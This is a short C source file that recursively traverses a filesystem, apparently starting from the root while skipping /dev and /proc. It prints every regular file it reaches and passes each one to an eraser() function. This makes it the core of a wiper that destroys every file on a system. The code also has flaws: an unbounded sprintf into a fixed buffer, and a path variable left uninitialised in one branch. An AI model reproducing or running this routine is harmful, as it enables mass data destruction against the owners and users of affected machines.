#include "inc/main.h"

static int	isAFile(const char *path)
{
	struct stat dir;

	stat(path, &dir);
	return (S_ISREG(dir.st_mode));
}

static int  isASymlink(const char *path)
{
	struct stat dir;

  lstat (path, &dir);
  return (S_ISLNK(dir.st_mode));
}

static int	isADir(const char *path)
{
	struct stat dir;

	stat(path, &dir);
	return (S_ISDIR(dir.st_mode));
}

void	find_file(char *old_path)
{
	struct dirent *file = NULL;
	char new_path[4096];
	char *UnallowDir[] = {"//dev", "//proc"};

  for (int i = 0; i < 2; i++)
  {
    if (strcmp(old_path, UnallowDir[i]) == 0)
		  return;
  }

  DIR *dir = opendir(old_path);
	if (dir)
	{
		while ((file = readdir(dir)) != NULL)
		{
			if (strcmp(file->d_name, ".") == 0 || strcmp(file->d_name, "..") == 0)
				continue;
      if (strlen(old_path) != 1) // Condition to avoid to get "//" as a path
        sprintf(new_path, "%s/%s", old_path, file->d_name); // Create the new path
			if (isADir(new_path) == 1&& isASymlink(new_path) == 0)
				find_file(new_path);
			else if (isAFile(new_path) == 1 && isASymlink(new_path) == 0)
			{
				printf("%s\n", new_path);
				eraser(new_path);
			}
		}
		closedir(dir);
	}
}
